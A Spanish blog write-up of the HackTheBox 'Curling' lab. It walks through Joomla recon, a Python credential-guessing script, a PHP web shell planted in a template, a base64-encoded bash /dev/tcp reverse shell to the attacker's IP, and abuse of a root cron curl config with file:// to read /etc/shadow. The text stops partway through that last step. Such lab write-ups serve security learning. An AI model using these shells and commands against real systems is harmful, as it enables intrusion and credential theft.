---
layout      : post
title       : "HackTheBox - Curling"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png
category    : [ htb ]
tags        : [ joomla, backup, cURL-config-file, /etc/shadow ]
---
Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con **templates** de **Joomla**, loops de backups (?), movimientos sensuales con un archivo de configuración de **cURL** y ayudamos al usuario **root** a renovar su contraseña modificando el archivo **/etc/shadow**.

![160curlingHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160curlingHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [L4mpje](https://www.hackthebox.eu/profile/29267).

Juegue juegue, todo pelota!

Encontraremos un servidor web con el **gestor de contenido `Joomla`** bastante juguetón, inspeccionaremos código y texto para extraer credenciales. Estas nos serán válidas contra el panel admin de **Joomla**. Estando dentro modificaremos un `template` para que interprete código `PHP` "malicioso", usaremos esto para obtener una **Reverse Shell** como el usuario `www-data`.

En el sistema, específicamente en la carpeta `/home` del usuario `floris` encontraremos un archivo llamado `password_backup`, el tipo de archivo nos indicará que es un comprimido, pero al descomprimirlo obtenemos otro comprimido, jugaremos con eso para después de unas cuantas descompresiones obtener el archivo `password.txt` y conseguir una **Shell** como el usuario **floris** en el sistema.

Nos daremos cuenta de que el usuario `root` esta ejecutando unas instrucciones automatizadas que interactúan con dos archivos a los que tenemos acceso, `input` y `report`. ***input*** es un archivo de configuración de `cURL` (o sea, toma el contenido y si son comandos usados por **curl**, los ejecuta) y ***report*** guarda la respuesta de la petición o configuración dada en ***input***. Haremos que el archivo `input` lea archivos del sistema jugando con `file://`, como la instrucción la ejecuta ***root*** podemos leer cualquier archivo.

Usaremos esa habilidad para modificar el archivo `/etc/shadow` con otra contraseña para el usuario ***root***, esto para obtener una **Shell** en el sistema como él.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Algo juguetona, pero toca temas realistas y conocidos.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Vivo vivito.

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Recorremos **CMS Joomla**](#puerto-80).
3. [Explotación](#explotacion).
  * [Modificamos **template** de **Joomla** para conseguir **ejecución remota de comandos**](#joomla-template-rce).
  * [Obtenemos **Reverse Shell** en el sistema como <u>www-data</u>](#joomla-template-rce-reverseshell).
4. [Movimiento lateral **backup_password**: Vamos de **www-data** a **floris**](#backupassword-floris).
  * [Jugamos a descomprimir el comprimido del comprimido](#password-decompress).
5. [Escalada de privilegios](#escalada-de-privilegios).
  * [Explotando el archivo que toma **cURL** como "configuración"](#breaking-curlfig).
  * [Cambiamos la contraseña del usuario **root** para obtener una **Shell**](#shadow-root).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Inicialmente necesitamos saber que puertos tiene abiertos la máquina, los descubriremos con `nmap`:

```bash
❱ nmap -p- --open -v 10.10.10.150 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

El escaneo nos devuelve dos puertos:

```bash
# Nmap 7.80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.150
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.150 ()	Status: Up
Host: 10.10.10.150 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 104.58 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Tenemos la opción de obtener una Shell de forma segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Esta sirviendo un servidor web. |

Ahora tenemos que profundizar un poco, necesitamos saber que versiones y script están siendo ejecutad@s por cada servicio (puerto), así nuestra próxima investigación es muuucho más pequeña:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.150
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.10.150 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Obtenemos:

```bash
# Nmap 7.80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12.56 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 |
| 80     | HTTP     | Apache httpd 2.4.29 |

Lo único llamativo es `Joomla`, que es un *gestor de contenido* web. Sigamos profundizando a ver que encontramos.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

De primeras vemos 4 cosas interesantes:

* El título hace referencia a **dos herramientas**: `cewl` (para extraer el texto de una página web y convertirlo en un objeto de palabras (como un diccionario)) y `curl` (para realizar peticiones web desde una consola).
* Estamos ante el **CMS (gestor de contenido)** `Joomla`.
* Y hay un **login panel**.

---

🌈 ***`Joomla` como dijimos es un gestor de contenido que permite crear sitios web intuitivos, dinámicos e interactivos. Contiene así mismo un -panel administrativo- el cual sirve para modificar toooooodo el contenido que contenga la web.***

Si revisamos la interfaz web vemos mucho texto, esto junto a la referencia de `cewl` nos podría indicar que debemos crear un diccionario de toooooooodas las palabras e intentar hacer un ataque de fuerza bruta contra el login. Pero claro, nos faltaría saber el usuario con el que probar cada palabra...

Leyendo por encima los anuncios nos damos cuenta de que hay dos referencias a posibles usuarios e incluso una cadena que podría ser una contraseña:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_readingHOME_possibleCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, ya tendríamos 3 usuarios con los cuales podríamos probar cada palabra de la web:

* `Super User` o `SuperUser` o `superuser` y distintas variantes.
* `Floris` o `floris` y variaciones.
* `pebble` o `Pebble`, etc.

Antes de eso veamos si existe algún recurso que el servidor esté sirviendo, pero que no veamos a simple vista:

```bash
❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.150/
...
Target: http://10.10.10.150/

[25:25:25] Starting: 
[25:25:25] 301 -  320B  - /administrator  ->  http://10.10.10.150/administrator/
[25:25:25] 301 -  310B  - /bin  ->  http://10.10.10.150/bin/
[25:25:25] 301 -  312B  - /cache  ->  http://10.10.10.150/cache/
[25:25:25] 301 -  317B  - /components  ->  http://10.10.10.150/components/
[25:25:25] 301 -  313B  - /images  ->  http://10.10.10.150/images/
[25:25:25] 301 -  315B  - /includes  ->  http://10.10.10.150/includes/
[25:25:25] 200 -   14KB - /index.php
[25:25:25] 301 -  315B  - /language  ->  http://10.10.10.150/language/
[25:25:25] 301 -  314B  - /layouts  ->  http://10.10.10.150/layouts/
[25:25:25] 301 -  316B  - /libraries  ->  http://10.10.10.150/libraries/
[25:25:25] 301 -  312B  - /media  ->  http://10.10.10.150/media/
[25:25:25] 301 -  314B  - /modules  ->  http://10.10.10.150/modules/
[25:25:25] 301 -  314B  - /plugins  ->  http://10.10.10.150/plugins/
[25:25:25] 403 -  300B  - /server-status
[25:25:25] 301 -  316B  - /templates  ->  http://10.10.10.150/templates/
[25:25:25] 301 -  310B  - /tmp  ->  http://10.10.10.150/tmp/
```

Vemos varios recursos y la mayoría son **redirects**, pero redireccionan al mismo recurso...

Todos son objetos que usa `Joomla` en su ejecución y funcionamiento, pero hay dos llamativos `administrator` y `tmp`. Revisando cada uno, simplemente **administrator** nos devuelve algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_administrator.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Recuerdan que en la definición de **Joomla** dijimos que existe un ***panel administrativo** el cual sirve para modificar tooooooodo lo relacionado con el sitio web, pues es este (: Pero de nuevo estamos F, no hay credenciales para probar (además de las default, pero que no funcionan).

Ya con nada más a enumerar, tenía puesto en mi mente el crear el script para jugar (pero no sabía que me faltaba algo que siempre hago y que esta vez se me olvido (¿ya saben que puede ser?), genere la estructura del script, empece a armar las funciones y las demás cositas. Llego el momento de ver si existían tokens o variables locas que viajaban entre el formulario, con lo cual era necesario ver la estructura (HTML) de la web. 

En este caso lo que veremos ahora lo encontré al ejecutar un script en `Python` y viendo la respuesta de una petición web con el método `GET` hacia el ***home (`index.php`)***, pero también se puede ver simplemente inspeccionando el código fuente `HTML`.

```py
...
import requests

URL = "http://10.10.10.150"

r = requests.get(URL)
print(r.text)
...
```

En su ejecución la respuesta (`r.text`) nos muestra algo curioso al final:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_scriptPY_rTEXThome_secretsTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAYA VAYAAAAAAAAAAAaa lo que vemoooooooooooooos, hay un comentario que dice `secret.txt`, o sea referencia un archivo `.txt`, si intentamos buscarlo como recurso de la web, l o e n c o n t r a m o s:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_secretsTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una cadena extraña, pero tiene tintes de estar encodeada en [base64](https://es.wikipedia.org/wiki/Base64), validémoslo intentando decodificarla:

```bash
❱ echo "Q3VybGluZzIwMTgh" | base64 -d
Curling2018!
```

OIEEEEEEEEEEEEEEeeeEeeee, eso sí que parece una contraseña eh! Bastante feo, raro y mehh que este ese recurso ahí en la web como si nada y con un comentario en el **home** referenciándola, pero bueno, sigamos...

Ya tenemos dos cadenas que parecen contraseñas:

* `curling2018`.
* `Curling2018!`.

Y tenemos los usuarios de antes, pues en vez de jugar con diccionarios probemos rápidamente cada usuario "potencial" con las dos contraseñas:

```py
#!/usr/bin/python3

import requests
import signal
import re

# Variables -----------------------.
URL = "http://10.10.10.150/administrator/index.php"

# Funciones -----------------------.
def def_handler(sig, frame):  # Ctrl+C
    print("\nsaLi3ndoo..\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def login(username, password):  # tryLogin
    # Generamos una nueva sesión para cada intento
    session = requests.Session()

    # Extraemos tokens de sesión
    r = session.get(URL)
    hidden_return_value = re.findall(r'<input type="hidden" name="return" value="(.*?)"', r.text)[0]
    hidden_csrf_token_value = re.findall(r'<script type="application/json" class="joomla-script-options new">{"csrf.token":"(.*?)"', r.text)[0]

    data_post = {
        "username": username,
        "passwd": password,
        "option": "com_login",
        "task": "login",
        "return": hidden_return_value,
        hidden_csrf_token_value: "1"
    }
    r = session.post(URL, data=data_post)

    if "Username and password do not match or you do not have an account yet" not in r.text:
        print(f"Credenciales válidas: {username}:{password}")
        exit(0)

def main():  # elCentrico
    array_users = ["Super User", "Floris", "plebbe"]
    array_passwords = ["curling2018", "Curling2018!"]

    for username in array_users:
        for password in array_passwords:
            # Enviamos el usuario con algunas variantes, como MAYUSCULAS, minusculas, quitando espacios, etc.
            login(username.lower(), password)
            login(username.upper(), password)
            login(username.replace(' ',''), password)
            login(username.replace(' ','').lower(), password)
            login(username.replace(' ','').upper(), password)

    print("Ninguna credencial es válida...")

# Inicio del programa -------------.
if __name__ == '__main__':
    main()
```

Si lo ejecutamos, tenemoooooooooooooooooooooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_scriptPY_fuzzUsers_validCREDSjoomla.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAAAAAAAAAAAA, pues validémoslas en la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_administrator_LOGIN_DONEasFLORIS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y SIII, tamos dentro (:

...

# Explotación [#](#explotacion) {#explotacion}

🔥 [Si ya sabes como conseguir **RCE** modificando el template en **Joomla** puedes evitar mi explicación e ir directamente a como obtuvimos la **Reverse Shell**](#joomla-template-rce-reverseshell).

Ya dentro el conseguir una ejecución remota de comandos es muy sencillo, sigamos un post que me gusta mucho:

* [Joomla Reverse Shell](https://www.hackingarticles.in/joomla-reverse-shell/).

Lo único que debemos hacer es modificar el contenido de un `template`, existen varios objetos, modificamos uno de ellos con nuestro código `PHP` y ya la web lo interpretaría (:

Por ejemplo hagamos que la web ejecute el comando `whoami` y que nos lo muestre:

---

## Modificamos <u>template</u> para conseguir <u>RCE</u> [📌](#joomla-template-rce) {#joomla-template-rce}

Debemos seguir esta ruta de clics, primero `extensions`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_extensions.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Después `templates`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_extensions_templates.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos algo así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templates.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Damos clic en donde indica la flecha y llegamos a este apartado:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templates_list.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Seleccionamos cualquiera de los dos ***templates***, yo usaré `Beez3`, damos clic en su nombre y veríamos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templateFILES_beez3.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Yo modificaré el archivo `error.php`, damos clic sobre él y empezamos a jugar...

El contenido original no nos interesa, lo borramos (o guardamos en algún lado para después volverlo dejar como si no hubiéramos modificado nada 🤭) y retomamos la idea de ejecutar `whoami`, el archivo quedaría así:

```php
<?php system("whoami"); ?>
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_template_beez3_errorPHP_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* [Manual PHP - system()](https://www.php.net/manual/es/function.system.php).

---

Lo siguiente será guardar el nuevo contenido del archivo `error.php`, damos `Save` y veríamos este mensaje:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_template_beez3_errorPHP_saved.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, ahora solo debemos ver el contenido **interpretado**, siguiendo esta ruta llegamos al objeto `error.php`:

```html
http://10.10.10.150/templates/beez3/error.php
```

Yyyyy en la web veríamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_templateBEEZ3_errorPHP_whoamiRCE_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OJOOOOOOOOOOOOOOOOOOOOOO, vemos que no hay errores y por el contrario se nos interpreta el contenido, nos indica que el usuario que ejecuta el servicio **Joomla** es `www-data`. ASÍ QUEEEEEE TEEEENEEEEEMOOOOOS ejecución remota de comandos sobre el sistema (:

Entablémonos una reverse Shell...

Podemos indicárselo en el mismo `sy, pero A MÍ me gusta guardar una variable desde el método `GET` que su contenido sea el que interprete la función `system()`, así no tenemos que estar modificando el contenido del template y solo jugamos con la variable `xmd`, veamos un ejemplo rápido. Esta sería la estructura del archivo `error.php`:

```php
<?php system($_GET['xmd']); ?>
```

Donde la petición recibirá una variable llamada `xmd` que contendrá nuestro comando y ese comando sería ejecutado por la función `system()`.

Guardamos y validamos el archivo en la web, ahora ejecutemos `hostname`:

```html
http://10.10.10.150/templates/beez3/error.php?xmd=hostname
```

Yyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_templateBEEZ3_errorPHP_GETvarXMD_hostnameRCE_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

LISTOOOONES, ahora si hagamos una reverse Shell (:

---

## Obtenemos <u>Shell</u> en el sistema como <u>www-data</u> [📌](#joomla-template-rce-reverseshell) {#joomla-template-rce-reverseshell}

Nos ponemos en escucha:

```bash
❱ nc -lvp 4433
```

Generamos nuestro payload (lo que ejecutara el sistema) y lo encodeamos en **base64**:

```bash
❱ echo "bash -i >& /dev/tcp/10.10.14.5/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo=
```

Una vez la petición sea recibida en nuestro puerto `4433` se generará una `/bin/bash`. 

Ahora **URLencodeamos** para evitar que `+` o `=` sean interpretados de manera errónea por la web, usaremos [esta web](https://www.urlencoder.org/):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_URLencode_revSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y lo que haremos para que el sistema entienda lo que le enviamos y lo interprete será:

```html
http://10.10.10.150/templates/beez3/error.php?xmd=echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo%3D | base64 -d | bash
```

Lanzamos la petición y en nuestro listeneeeeeeeeeeeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMO DENTROOROROWOWOWOWOWOWOOWOW!!

...

He creado un script para automatizar la modificación del template y obtener ejecución remota de comandos desde él, se los dejo por si algo (con él no es necesario **URLencodear** nada):

🔢 [***joomlArce.py***](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/curling/joomlArce.py)

...

Antes de seguir hagamos un tratamiento de la **TTY**, esto para que nuestra Shell sea completamente interactiva, nos permita ejecutar `Ctrl+C`, tener histórico de comandos y movernos entre ellos.

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty).

Ahora si sigamos...

...

# backup_password: www-data -> floris [#](#backupassword-floris) {#backupassword-floris}


Enumerando los directorios desde que obtenemos la reverse Shell hacia atrás vemos uno llamativo ¿lo ves?:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_lsLA_configurationPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un objeto con nombre `configuration.php` nos dice "investígame", así que hagámosle caso:

(Es muy grande 😏)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_configurationPHP_creds.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Entre todo lo que hay detallamos dos contraseñas, `$password` y `$secret`. Una de ellas es para el servicio `MySQL` y el usuario `floris`, si las probamos si nos permiten entrar al servicio `MySQL`, pero no encontramos nada útil en él :( e intentando reutilización de contraseñas tampoco obtenemos nada...

Enumerando el sistema, encontramos un dos archivos llamativos en el `/home` de **floris**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_lsLA_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* El directorio `admin-area`, pero no tenemos acceso a él aún.
* Por el contrario si tenemos acceso al objeto `password_backup`. 

---

## Descomprimiendo el comprimido del comprimido [📌](#password-decompress) {#password-decompress}

Veamos el backup...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_catBackupPassword.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

El resultado de un dumpeo `hexadecimal` contra un objeto, pero ¿cómo sabemos que es de un objeto?, bueno, investigando existe una herramienta con la que podemos (entre muuuchas cosas) -revertir- ese contenido **hexadecimal** al original.

* [xxd - Unix, Linux Command](https://www.tutorialspoint.com/unix_commands/xxd.htm)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_xxd_revert.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues intentémoslo y guardemos el resultado en un archivo:

```bash
www-data@curling:/home/floris$ xxd -r password_backup > /tmp/file_reverse
```

Y si validamos el archivo resultante vemos el tipo de archivo original:

```bash
www-data@curling:/tmp$ file file_reverse 
file_reverse: bzip2 compressed data, block size = 900k
```

Un comprimido [bzip2](https://es.wikipedia.org/wiki/Bzip2), pues démosle el nombre de archivo necesario e intentemos descomprimirlo:

(***Al ser poquitas veces las que debemos descomprimir el archivo, aprovecho para mostrarles el paso a paso***)

```bash
www-data@curling:/tmp$ mv file_reverse file_reverse.bz2
www-data@curling:/tmp$ bzip2 -d file_reverse.bz2
```

Y como resultado tenemos un nuevo objeto:

```bash
www-data@curling:/tmp$ file file_reverse 
file_reverse: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
```

Ahora tenemos un objeto comprimido con [gzip](https://www.ochobitshacenunbyte.com/2019/09/19/comandos-gzip-y-gunzip-en-gnu-linux/), descomprimámoslo:

```bash
www-data@curling:/tmp$ mv file_reverse file_reverse.gz
www-data@curling:/tmp$ gzip -d file_reverse.gz
```

Y obtenemos un nuevo `bzip2`:

```bash
www-data@curling:/tmp$ file file_reverse 
file_reverse: bzip2 compressed data, block size = 900k
```

Volvemos a descomprimirlo:

```bash
www-data@curling:/tmp$ mv file_reverse file_reverse.bz2  
www-data@curling:/tmp$ bzip2 -d file_reverse.bz2
```

Y como resultado ahora obtenemos:

```bash
www-data@curling:/tmp$ file file_reverse 
file_reverse: POSIX tar archive (GNU)
```

Un objeto [tar](https://www.howtogeek.com/248780/how-to-compress-and-extract-files-using-the-tar-command-on-linux/), descomprimámoslo:

```bash
www-data@curling:/tmp$ mv file_reverse file_reverse.tar.gz
www-data@curling:/tmp$ tar -xvf file_reverse.tar.gz 
password.txt
```

Nos devuelve el objeto `password.txt` y ese si parece ser un archivo de texto, validemos:

```bash
www-data@curling:/tmp$ file password.txt 
password.txt: ASCII text
```

Pos si, si vemos su contenido encontramos una cadena que si tiene toda la pinta de ser una credencial:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_passwordTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues si la validamos ya sea con `su floris` o ejecutando en otra terminal `ssh floris@10.10.10.150`, vamos a obtener lo mismo, una **sesión en el sistema como `floris`**:

```bash
❱ ssh floris@10.10.10.150
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_ssh_florisSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PEEEERRRFECCCTOOOO!!

...

Cree un script en `bash` que va a moverse entre toooooodos los archivos modificando sus nombres y efectuando la dezcomprimhisazion:

🔢 [brutopress.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/curling/brutopress.sh)

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si recordamos había una carpeta bastante llamativa en el `/home` de **floris**:

```bash
floris@curling:~$ ls
admin-area  password_backup  user.txt
```

Veamos que hay en ella:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_lsLA_HomeAdminPanel.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmmm, si nos fijamos son archivos actuales y que tienen la misma hora-fecha de creación/modificación, YYYYY al estar en el grupo `floris` tenemos acceso a modificarlos y leerlos, curioso, bastante curioso...

Revisando el contenido de cada uno tenemos:

```bash
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
```

```html
floris@curling:~/admin-area$ cat report
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charset="utf-8" />
        <base href="http://127.0.0.1/" />
        <meta name="description" content="best curling site on the planet!" />
        <meta name="generator" content="Joomla! - Open Source Content Management" />
        <title>Home</title>
        ...
...
```

El objeto `report` tiene el mismo código **HTML** que si hacemos una petición hacia el recurso `http://10.10.10.150`, con lo cual sabemos que internamente también esta siendo ejecutado el **CMS** `Joomla`...

Sin entender muy bien que hacer me puse a enumerar que instrucciones o acciones están siendo ejecutadas de manera -automatizada- en el sistema.

Existen varios métodos, pero hay una herramienta llamada [pspy](https://github.com/DominicBreuker/pspy) que hace un recorrido por el sistema buscando tareas que se estén ejecutando.

Descargamos el binario de [acá](https://github.com/DominicBreuker/pspy/releases) y lo subimos a la máquina:

```bash
# Creamos entorno de trabajo
floris@curling:/tmp$ mkdir miacosa
floris@curling:/tmp$ cd miacosa/
floris@curling:/tmp/miacosa$ curl http://10.10.14.5:8000/pspy -o pspy
floris@curling:/tmp/miacosa$ file pspy 
pspy: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
```

Listo, ahora lo ejecutamos:

```bash
floris@curling:/tmp/miacosa$ chmod +x pspy
floris@curling:/tmp/miacosa$ ./pspy
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_pspy_FOUNDcurl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAa, existen dos instrucciones siendo ejecutadas por el usuario `root` (por el **UID** (user id), ***root*** siempre tiene asignado `0`), pero solo una nos llama la atención, ya que esta interactuando con los archivos `input` y `report`, los dos objetos que encontramos antes y que tenían fecha-hora igual. ¡Ahí esta la razón de eso!!

Es ejecutada cada minuto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_pspy_FOUNDcurlEACHminute.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La instrucción es sencilla:

```bash
/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

El parámetro `-K` toma un archivo de configuración, en su contenido van instrucciones que `cURL` interpretara, por ejemplo podemos pasarle `user-agent`, `url`, `output`, `-L` (para ver redirecciones), [etc](https://everything.curl.dev/cmdline/configfile). Todos los argumentos con los que ejecutamos `cURL` desde la terminal los podemos agregar en un archivo y pasárselo con el parámetro `-K`:

⚙️ `-K, --config <file>`

* Specify a text file **to read curl arguments from**. ***The command line arguments found in the text file will be used as if they were provided on the command line***.

Como el único argumento actual en `input` es:

```bash
url = "http://127.0.0.1"
```

Esta haciendo una petición hacia esa **URL** (:

Y simplemente el resultado de la consulta la guarda en `report` (con `-o`). Sencillito de entender. Ahora veamos como romper esoooooooooooooooooooowoweoriwqeru...

...

## Jugando con el archivo que toma <u>cURL</u> como configuración [📌](#breaking-curlfig) {#breaking-curlfig}

Intentando cositas como pasarle nuestra **URL** de algún servidor `Python`, recibimos la petición, pero claro, no tenemos posibilidad de indicarle que **interprete** lo que sea que tengamos sirviendo 😞

Buscando y buscando llegamos a este recurso del siempre fiel `GTFOBins` (échenle un ojo, tiene muuuuuuuchas maneras de explotar muuuuuuuuuuchos binarios):

* [https://gtfobins.github.io/gtfobins/curl/](https://gtfobins.github.io/gtfobins/curl/).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_gtfobins_curl_READfile.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos indica que si queremos leer archivos podemos usar `file://` seguido del archivo en cuestión... OPA, interesante, puees si la instrucción `cURL` la esta ejecutando `root` podemos ver archivos privilegiados, ¿no? Puuuuuues intentemos ver el archivo que contiene tooodas las contraseñas de los usuarios del sistema, el objeto [/etc/shadow](https://searchsecurity.techtarget.com/definition/shadow-password-file):

Debemos modificar el archivo `input` con esto:

```bash
